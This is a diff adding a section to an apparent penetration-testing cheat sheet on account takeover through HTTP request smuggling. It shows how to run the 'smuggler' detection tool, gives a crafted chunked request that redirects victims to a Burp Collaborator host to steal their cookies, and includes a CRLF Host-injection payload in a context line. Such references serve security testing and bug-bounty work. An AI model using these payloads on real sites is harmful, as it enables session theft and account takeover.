@@ -1963,6 +1963,49 @@ with CLRF: `/resetPassword?0a%0dHost:atracker.tld` (x-host, true-client-ip, x-fo
 
 </details>
 
+<details>
+
+<summary>Account Takeover Via HTTP Request Smuggling</summary>
+
+1. Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)
+
+{% code overflow="wrap" %}
+```bash
+git clone https://github.com/defparam/smuggler.git 
+cd smuggler
+python3 smuggler.py -h
+```
+{% endcode %}
+
+2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:
+3. `GET http://something.burpcollaborator.net HTTP/1.1 X:` with the goal of open redirect the victims to burpcollab and steal their cookies
+4. Final request could look like the following
+
+{% code overflow="wrap" %}
+```http
+GET / HTTP/1.1
+Transfer-Encoding: chunked
+Host: something.com
+User-Agent: Smuggler/v1.0
+Content-Length: 83
+0
+GET http://something.burpcollaborator.net HTTP/1.1
+X: X
+```
+{% endcode %}
+
+Hackerone reports exploiting this bug
+
+{% embed url="https://hackerone.com/reports/737140" %}
+
+{% embed url="https://hackerone.com/reports/771666" %}
+
+</details>
+
+
+
+
+
 ### Change Password
 
 <details>
